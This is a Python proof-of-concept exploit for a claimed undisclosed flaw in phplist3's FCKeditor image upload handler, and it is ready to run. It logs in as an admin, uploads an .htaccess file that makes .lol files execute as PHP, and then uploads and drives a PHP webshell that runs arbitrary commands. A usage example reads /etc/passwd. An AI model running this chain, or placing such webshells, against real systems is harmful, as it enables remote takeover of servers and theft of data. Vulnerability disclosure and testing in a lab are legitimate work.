#!/usr/bin/env python3
"""
phplist3 RCE PoC - FCKeditor Image Upload + .htaccess Bypass

CVE: N/A (0-day)
Affected: phplist3 <= 3.6.16 (and possibly earlier)
Type: Post-Auth / Admin RCE

Description:
  The fckphplist.php upload handler lacks server-side file extension validation.
  The admin/.htaccess only blocks .php and .inc, but allows .htaccess files through.
  With AllowOverride On, an attacker can:

  1. Upload .htaccess with: AddType application/x-httpd-php .lol
  2. Upload shell.lol containing PHP code
  3. Access shell.lol via HTTP → PHP executes → RCE

Usage:
  # Full auto exploit
  python3 poc_rce.py --target http://localhost:18080/lists/admin \
                     --username admin --password testpass123 \
                     --cmd "id"

  # Just upload webshell
  python3 poc_rce.py --target http://localhost:18080/lists/admin \
                     --username admin --password testpass123 \
                     --upload-only

  # Clean uploaded files
  python3 poc_rce.py --target http://localhost:18080/lists/admin \
                     --username admin --password testpass123 \
                     --clean

  # Use custom webshell name
  python3 poc_rce.py --target http://localhost:18080/lists/admin \
                     --username admin --password testpass123 \
                     --shell-name images.lol \
                     --cmd "whoami"
"""

import argparse
import io
import os
import re
import sys
import time
import uuid
from http.cookiejar import LWPCookieJar

try:
    import requests
except ImportError:
    print("[!] Missing requests library. Install: pip3 install requests")
    sys.exit(1)


class PhplistRceExploit:
    """phplist3 FCKeditor upload -> .htaccess bypass -> RCE"""

    UPLOAD_PATH = "/?page=fckphplist&action=uploadimage"
    LOGIN_PATH = "/?page=home"
    HOMEPAGE_PATH = "/"

    def __init__(self, target: str, username: str, password: str,
                 shell_name: str = None, debug: bool = False):
        # Normalize target URL
        target = target.rstrip("/")
        if target.endswith("/admin"):
            target = target[:-6]
        if target.endswith("/admin/"):
            target = target[:-7]

        # Extract scheme+host from target
        # target can be: "http://host/lists" or just "http://host"
        from urllib.parse import urlparse
        parsed = urlparse(target)
        self.base_host = f"{parsed.scheme}://{parsed.netloc}"
        # Determine the pageroot prefix
        path = parsed.path.rstrip("/")
        if path.endswith("/lists"):
            self.pageroot_prefix = "/lists"
        elif path == "" or path == "/":
            self.pageroot_prefix = "/lists"  # default pageroot
        else:
            self.pageroot_prefix = path  # custom pageroot

        self.admin_base = f"{self.base_host}{self.pageroot_prefix}/admin"
        self.target = self.admin_base  # for backward compat

        self.username = username
        self.password = password
        self.debug = debug

        # Shell filename (must NOT end in .php or .inc)
        rand_suffix = uuid.uuid4().hex[:6]
        self.shell_name = shell_name or f"images_{rand_suffix}.lol"
        self.htaccess_name = ".htaccess"
        # Shell accessible at: {base_host}{pageroot}/uploadimages/{shell_name}
        self.shell_url = f"{self.base_host}{self.pageroot_prefix}/uploadimages/{self.shell_name}"

        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        })

        # Temporary files
        self._local_htaccess = f"/tmp/_phplist_poc_htaccess_{rand_suffix}"
        self._local_shell = f"/tmp/_phplist_poc_shell_{rand_suffix}"

    def log(self, msg: str, level: str = "[*]"):
        print(f"  {level} {msg}")

    def debug_log(self, msg: str):
        if self.debug:
            self.log(msg, "[DEBUG]")

    # ------------------------------------------------------------------ #
    #  Step 1: Login
    # ------------------------------------------------------------------ #
    def login(self) -> bool:
        """Authenticate as admin. Returns True on success."""
        self.log(f"Logging in as '{self.username}' ...")

        resp = self.session.get(f"{self.target}/")
        if resp.status_code == 200:
            pass  # OK
        elif resp.status_code == 302:
            pass  # Redirect to login is normal
        else:
            self.log(f"Target unreachable: HTTP {resp.status_code}", "[!]")
            return False

        resp = self.session.post(
            f"{self.target}{self.LOGIN_PATH}",
            data={
                "login": self.username,
                "password": self.password,
                "process": "Continue",
                "page": "home",
            },
            allow_redirects=True,
        )

        # Check login success
        body_lower = resp.text.lower()
        if "logout" in body_lower and 'href' in resp.text:
            self.log("Login successful")
            return True
        elif "login" in body_lower and ("password" in body_lower or "name" in body_lower):
            self.log("Login FAILED - check credentials", "[!]")
            return False
        else:
            self.log(f"Login status: HTTP {resp.status_code}, checking further ...", "[?]")
            # Try a more robust check
            if "Logout" in resp.text or 'page=logout' in resp.text:
                self.log("Login confirmed (found Logout link)")
                return True
            self.log("Could not confirm login - trying anyway", "[?]")
            return True  # optimistic - let upload attempt reveal the truth

    # ------------------------------------------------------------------ #
    #  Step 2: Upload .htaccess
    # ------------------------------------------------------------------ #
    def _prepare_payloads(self):
        """Write payload files to temp directory."""
        # .htaccess content: enable PHP execution for .lol files
        with open(self._local_htaccess, "w") as f:
            f.write("AddType application/x-httpd-php .lol\n")

        # PHP webshell
        php_code = (
            '<?php '
            'if(isset($_REQUEST["cmd"])){'
            'echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>";'
            '}'
            '?>'
        )
        with open(self._local_shell, "w") as f:
            f.write(php_code)

    def upload_htaccess(self) -> bool:
        """Upload .htaccess to enable PHP for .lol extension."""
        self.log("Uploading .htaccess to lists/uploadimages/ ...")

        if not os.path.exists(self._local_htaccess):
            self._prepare_payloads()

        with open(self._local_htaccess, "rb") as f:
            files = {"FCKeditor_File": (".htaccess", f, "application/octet-stream")}
            resp = self.session.post(
                f"{self.target}{self.UPLOAD_PATH}",
                files=files,
            )

        success = 'window.opener.setImage' in resp.text or 'Upload in progress' in resp.text
        if success:
            self.log(".htaccess uploaded successfully")
            # Verify it was written
            if self.debug:
                verify = self.session.get(
                    f"{self.target}/lists/uploadimages/.htaccess"
                )
                self.debug_log(f".htaccess reachable: HTTP {verify.status_code}")
            return True
        else:
            error_msg = re.search(r'Error\s*:\s*([^<]+)', resp.text)
            if error_msg:
                self.log(f"Upload failed: {error_msg.group(1).strip()}", "[!]")
            else:
                self.log("Upload .htaccess failed (unknown reason)", "[!]")
            return False

    # ------------------------------------------------------------------ #
    #  Step 3: Upload PHP webshell
    # ------------------------------------------------------------------ #
    def upload_shell(self) -> bool:
        """Upload the PHP webshell as .lol file."""
        self.log(f"Uploading webshell as '{self.shell_name}' ...")

        if not os.path.exists(self._local_shell):
            self._prepare_payloads()

        with open(self._local_shell, "rb") as f:
            files = {"FCKeditor_File": (self.shell_name, f, "application/octet-stream")}
            resp = self.session.post(
                f"{self.target}{self.UPLOAD_PATH}",
                files=files,
            )

        success = 'window.opener.setImage' in resp.text
        if success:
            self.log(f"Webshell uploaded: {self.shell_url}")
            return True
        else:
            error_msg = re.search(r'Error\s*:\s*([^<]+)', resp.text)
            if error_msg:
                self.log(f"Upload failed: {error_msg.group(1).strip()}", "[!]")
            else:
                self.log("Upload webshell failed (unknown reason)", "[!]")
            return False

    # ------------------------------------------------------------------ #
    #  Step 4: Execute command
    # ------------------------------------------------------------------ #
    def exec_cmd(self, cmd: str) -> str:
        """Execute a command via the webshell and return output."""
        self.log(f"Executing: {cmd}")
        try:
            resp = self.session.get(
                self.shell_url,
                params={"cmd": cmd},
                timeout=15,
            )
            if resp.status_code == 200 and resp.text.strip():
                output = resp.text.strip()
                # Strip the <pre> tags if present
                output = re.sub(r'^<pre>|</pre>$', '', output)
                return output
            elif resp.status_code == 404:
                return "[!] Webshell not found (404). Did upload succeed?"
            elif resp.status_code == 403:
                return "[!] Access forbidden (403). .htaccess bypass may have failed."
            else:
                return f"[!] HTTP {resp.status_code}: {resp.text[:200]}"
        except requests.RequestException as e:
            return f"[!] Connection error: {e}"

    # ------------------------------------------------------------------ #
    #  Full chain
    # ------------------------------------------------------------------ #
    def run(self, cmd: str = None) -> bool:
        """Execute full attack chain."""
        print(f"\n  {'='*50}")
        print(f"  phplist3 RCE PoC")
        print(f"  Target: {self.target}")
        print(f"  Webshell: {self.shell_url}")
        print(f"  {'='*50}\n")

        # Prepare temp files
        self._prepare_payloads()

        # Login
        if not self.login():
            return False

        time.sleep(0.5)

        # Upload .htaccess
        if not self.upload_htaccess():
            self.log("TIP: The uploadimages/ directory may not exist yet.", "[?]")
            self.log("The first upload attempt often fails if the directory", "[?]")
            self.log("needs to be created. Retrying once ...")
            time.sleep(1)
            if not self.upload_htaccess():
                return False

        time.sleep(0.5)

        # Upload webshell
        if not self.upload_shell():
            return False

        time.sleep(0.5)

        # Execute command
        if cmd:
            output = self.exec_cmd(cmd)
            print(f"\n  [Result] {cmd}")
            print(f"  {'-'*40}")
            print(f"  {output}")
            print(f"  {'-'*40}\n")
        else:
            # Default: verify RCE
            output = self.exec_cmd("id")
            print(f"\n  [Verification] id")
            print(f"  {'-'*40}")
            print(f"  {output}")
            print(f"  {'-'*40}\n")

            if "uid=" in output:
                self.log("RCE CONFIRMED!", "[+]")
                return True
            else:
                self.log("RCE verification ambiguous", "[?]")
                return False

        # Clean up temp files
        self._cleanup_temp()
        return True

    # ------------------------------------------------------------------ #
    #  Cleanup
    # ------------------------------------------------------------------ #
    def _cleanup_temp(self):
        """Remove temp payload files."""
        for f in [self._local_htaccess, self._local_shell]:
            try:
                if os.path.exists(f):
                    os.unlink(f)
            except OSError:
                pass

    def clean(self) -> bool:
        """Remove uploaded files via the admin interface."""
        self.log("Cleaning up uploaded files ...")

        if not self.login():
            return False

        # The cleanest way is to overwrite .htaccess to restore defaults
        # Upload a blank/disabled .htaccess
        local_restore = f"/tmp/_phplist_poc_restore"
        try:
            with open(local_restore, "w") as f:
                f.write("# restored by poc_rce.py\n")
            with open(local_restore, "rb") as f:
                files = {"FCKeditor_File": (".htaccess", f, "application/octet-stream")}
                resp = self.session.post(
                    f"{self.target}{self.UPLOAD_PATH}",
                    files=files,
                )
            self.log(".htaccess restored to default")
        finally:
            try:
                os.unlink(local_restore)
            except OSError:
                pass

        # Upload a dummy harmless file to overwrite the shell
        local_dummy = f"/tmp/_phplist_poc_dummy"
        try:
            with open(local_dummy, "w") as f:
                f.write("harmless")
            with open(local_dummy, "rb") as f:
                files = {"FCKeditor_File": (self.shell_name, f, "text/plain")}
                resp = self.session.post(
                    f"{self.target}{self.UPLOAD_PATH}",
                    files=files,
                )
            self.log(f"Webshell '{self.shell_name}' overwritten with harmless data")
        finally:
            try:
                os.unlink(local_dummy)
            except OSError:
                pass

        self._cleanup_temp()
        return True

    # ------------------------------------------------------------------ #
    #  Upload only mode (for manual interaction)
    # ------------------------------------------------------------------ #
    def upload_only(self) -> bool:
        """Only upload .htaccess + webshell, don't execute commands."""
        self._prepare_payloads()
        if not self.login():
            return False
        if not self.upload_htaccess():
            time.sleep(1)
            self.upload_htaccess()
        if not self.upload_shell():
            return False
        self._cleanup_temp()
        print(f"\n  [*] Webshell ready: {self.shell_url}")
        print(f"  [*] Usage: curl '{self.shell_url}?cmd=id'")
        return True


def main():
    parser = argparse.ArgumentParser(
        description="phplist3 RCE PoC - FCKeditor Upload + .htaccess Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://localhost:18080/lists --username admin --password testpass123 --cmd "id"
  %(prog)s --target http://target.com/lists --username admin --password secret --upload-only
  %(prog)s --target http://target.com/lists --username admin --password secret --clean
  %(prog)s --target http://target:18080/lists --username admin --password test --shell-name x.lol --cmd "cat /etc/passwd"
        """,
    )
    parser.add_argument("--target", required=True, help="Base URL (e.g. http://localhost:18080/lists)")
    parser.add_argument("--username", default="admin", help="Admin username (default: admin)")
    parser.add_argument("--password", required=True, help="Admin password")
    parser.add_argument("--cmd", help="Command to execute on the target")
    parser.add_argument("--shell-name", help="Custom webshell filename (must NOT end in .php/.inc)")
    parser.add_argument("--upload-only", action="store_true", help="Upload files only, don't exec")
    parser.add_argument("--clean", action="store_true", help="Remove uploaded files")
    parser.add_argument("--debug", action="store_true", help="Verbose debug output")

    args = parser.parse_args()

    exploit = PhplistRceExploit(
        target=args.target,
        username=args.username,
        password=args.password,
        shell_name=args.shell_name,
        debug=args.debug,
    )

    try:
        if args.clean:
            success = exploit.clean()
        elif args.upload_only:
            success = exploit.upload_only()
        else:
            success = exploit.run(cmd=args.cmd)
    except KeyboardInterrupt:
        print("\n  [!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n  [!] Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)

    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
